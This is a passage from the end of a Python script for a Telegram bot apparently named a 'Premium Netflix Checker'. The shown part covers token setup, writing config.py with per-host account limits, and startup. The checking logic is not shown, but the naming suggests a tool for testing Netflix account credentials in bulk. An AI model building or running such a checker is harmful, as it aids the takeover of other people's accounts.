        with open("config.py", "w") as f:
            f.write(f'# Universal Netflix Checker Bot Configuration\n')
            f.write(f'BOT_TOKEN = "{token}"\n')
            f.write(f'\n# Platform-Specific Settings\n')
            f.write(f'# MAX_ACCOUNTS_RAILWAY = 100\n')
            f.write(f'# MAX_ACCOUNTS_RENDER = 100\n')
            f.write(f'# MAX_ACCOUNTS_HEROKU = 50\n')
            f.write(f'# MAX_ACCOUNTS_TERMUX = 50\n')
            f.write(f'# MAX_ACCOUNTS_VPS = 500\n')
        
        print("✅ config.py created successfully!")
        return token
        
    except Exception as e:
        print(f"❌ Error creating config.py: {e}")
        return None

if __name__ == "__main__":
    # Get bot token
    BOT_TOKEN = get_bot_token()
    
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not found!")
        BOT_TOKEN = setup_bot_token()
    
    if not BOT_TOKEN:
        print("\n🚫 Cannot start bot without token!")
        print("\n💡 Setup Methods:")
        print("1. Create config.py with: BOT_TOKEN = 'your_token'")
        print("2. Set environment variable: export BOT_TOKEN='your_token'")
        print("3. Edit the code and set HARDCODED_TOKEN")
        print("\n🤖 Get token from @BotFather on Telegram")
        exit(1)
    
    # Start the universal bot
    print("\n🎉 Starting 💎An0nOtF Premium Netflix Checker💎 Bot...")
    bot = UniversalNetflixCheckerBot(BOT_TOKEN)
    bot.application.post_init = bot.on_startup
    bot.run()
